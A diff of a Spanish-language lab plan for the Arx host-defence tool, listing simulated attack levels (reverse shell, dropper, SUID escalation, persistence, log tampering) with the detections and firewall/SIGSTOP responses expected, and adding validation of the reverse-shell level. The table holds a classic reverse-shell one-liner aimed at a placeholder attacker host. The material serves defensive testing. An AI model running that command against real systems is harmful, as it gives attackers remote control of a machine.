@@ -51,7 +51,7 @@ laboratorio). Solo cuando A y B estén verdes.
 | **3 — Credencial débil** | Login SSH con usuario nuevo/credencial por defecto | `login_users` fuera de baseline → hallazgo high | Hallazgo nuevo registrado y alertado |
 | **4 — Explotación de servicio** | App web vulnerable plantada (RCE) → el atacante abre un listener nuevo (p. ej. 4444) | Puerto nuevo → Tier 1: bloqueo firewall REAL + registro | Regla de bloqueo visible (ufw/nft) y auto-expira |
 | **5 — Dropper** | Descargar "malware" a `/tmp`, `chmod +x`, ejecutarlo | Ejecutable nuevo en dir sospechoso (high) → **SIGSTOP** inmediato | Proceso en estado T; SIGCONT al expirar; reaparición → Tier 2 |
-| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima | Conexión saliente anómala + proceso hijo raro | **GAP hoy** — el colector de conexiones ya existe (`recon.collect_connections`); falta la correlación con el ejecutable origen (Falco/`ss -p`) y el actuador `ss -K` |
+| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima; el atacante envía órdenes por el canal | Correlación conexión→proceso (inode de socket → `/proc/<pid>/exe`): un shell con socket saliente → **Tier 1: canal bloqueado con DROP en nftables + SIGSTOP solo del proceso dueño** | La orden previa se ejecuta; tras detectar, otra orden NO llega aunque se descongele el shell y no puede reconectar; otro `bash` del host sigue intacto; al expirar, la orden retenida SÍ llega (reversible de verdad). Intérpretes generales (python/perl) quedan para F8 |
 | **7 — Escalada** | Plantar binario SUID nuevo (`chmod u+s`) | Barrido SUID + integridad → **crit** | Hallazgo crit en el siguiente barrido SUID |
 | **8 — Persistencia** | Entrada en cron/systemd/`authorized_keys` | Integridad drift → **crit → Tier 2** (humano decide) → restauración desde vault + intruso en cuarentena | Pendiente autorizado → fichero hostil fuera de su sitio y preservado como evidencia |
 | **9 — Anti-forense** | Truncar logs + leer ficheros sensibles (señuelos) | Canary: lectura detectada (alta, one-shot); **truncado de auth.log → `log_tamper`** | Canary ✓ + hallazgo `log_tamper` (mismo inode, tamaño menor) |
@@ -66,12 +66,24 @@ honesto de lo que falta construir (y cada gap ya tiene fase en el roadmap).
 ## Ejecución
 
 ```bash
-lab/docker-lab.sh        # mini-lab DOS contenedores: L1 y L2 reales (nmap/sshpass
-                         # desde el atacante) + L4,5,7,8,9 en la víctima + prueba de
-                         # contención (el atacante pierde alcance tras el bloqueo)
-lab/run-levels.sh N      # un nivel concreto dentro de la víctima
+lab/docker-lab.sh        # mini-lab DOS contenedores: L1, L2 y L6 reales (nmap/sshpass/
+                         # reverse shell desde el atacante) + L4,5,7,8,9 en la víctima +
+                         # prueba de contención + fase tarpit (estrangula en vez de bloquear)
+lab/demo.sh              # versión corta de tres ataques, con la salida real de Arx (GIF del README)
 ```
 
 El scoreboard imprime PASS/FAIL por nivel. Los niveles 3 y 10 necesitan VM (L3 toca
-credenciales reales; L10 es destructivo — ver `lab/vm/`). El nivel 6 sigue en GAP
-honesto: falta la correlación conexión→proceso origen y el actuador `ss -K` (F5).
+credenciales reales; L10 es destructivo — ver `lab/vm/`) y aún no se han corrido. El nivel 6
+se valida en la fase de red: el atacante escucha con `nc`, la víctima abre el reverse shell
+clásico y Arx corta el canal y suspende solo al dueño. Límite honesto: los reverse shell por
+intérprete general (python, perl, php) se dejan para los sensores de comportamiento de F8.
+
+El **tarpit (Core)** se valida en su propia fase (`net-tarpit`): con la política
+`ip_response=tarpit`, reutilizando el escaneo del L1, Arx mete la IP hostil en el set nft
+`tarpit4` con reglas de rate-limit per-IP (no en `block_ipv4`) — estrangula en vez de
+cortar. Es un primer contacto (pizarra limpia), reversible y auto-expira. No es un tarpit
+clásico de retención de conexión: eso es la vía de engaño de Pro/Business (el honeypot).
+
+Dos lecciones del harness: `ncat` con stdin cerrado (`docker exec -d`) cierra cada conexión
+al instante, por eso el C2 usa `nc`; y `ss -K` no sirve para validar nada en Docker Desktop,
+porque su kernel no trae `CONFIG_INET_DIAG_DESTROY` y la orden devuelve 0 sin cortar.
